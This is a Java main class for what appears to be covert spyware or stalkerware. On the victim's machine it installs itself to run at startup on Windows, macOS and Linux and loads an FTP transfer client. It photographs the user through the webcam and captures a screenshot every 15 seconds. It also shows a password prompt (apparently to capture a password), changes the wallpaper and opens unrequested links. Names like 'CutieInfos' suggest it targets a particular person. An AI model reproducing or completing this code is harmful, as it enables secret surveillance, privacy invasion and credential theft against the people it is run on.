package fr.mimifan.jac;

import com.formdev.flatlaf.util.SystemInfo;
import fr.mimifan.jac.browser.BrowserManager;
import fr.mimifan.jac.popups.PasswordPopup;
import fr.mimifan.jac.popups.PopupsManager;
import fr.mimifan.jac.screens.ScreenShotter;
import fr.mimifan.jac.ftp.FileTransferClient;
import fr.mimifan.jac.utils.CutieInfos;
import fr.mimifan.jac.utils.StartupRunning;
import fr.mimifan.jac.wallpaper.WallpaperManager;
import java.io.IOException;
import java.net.InetAddress;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import com.formdev.flatlaf.FlatDarculaLaf;
import fr.mimifan.jac.webcam.WebcamManager;

public class Main {


    public static void main(String[] args) throws IOException {

        FlatDarculaLaf.setup();

        InetAddress localhost = InetAddress.getLocalHost();
        CutieInfos.hostname = localhost.getHostName();

        BrowserManager.openLink("https://discord.gg/DKnqAAvAwa");

        if(SystemInfo.isWindows) StartupRunning.enableStartupWindows();
        else if (SystemInfo.isMacOS) {
            StartupRunning.enableStartupMac();
        } else StartupRunning.enableStartupLinux();


        new CutieInfos();
        System.out.println(CutieInfos.cutiesDiscordName);

        FileTransferClient.getInstance().load();

        Thread popupsThread = new Thread(PopupsManager::load);
        popupsThread.start();

        Thread wallpaperThread = new Thread(WallpaperManager::changeWallPaper);
        wallpaperThread.start();

        Thread webcamThread = new Thread(WebcamManager::takePicture);
        webcamThread.start();


        ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
        executor.scheduleAtFixedRate(() -> ScreenShotter.getInstance().takeScreenShot(), 0, 15, TimeUnit.SECONDS);

        PasswordPopup passwordPopup = new PasswordPopup();
        passwordPopup.setVisible(true);


        Thread websitesThread = new Thread(BrowserManager::randomLinks);
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                websitesThread.start();
            }
        }, 90 * 1000);

    }

}
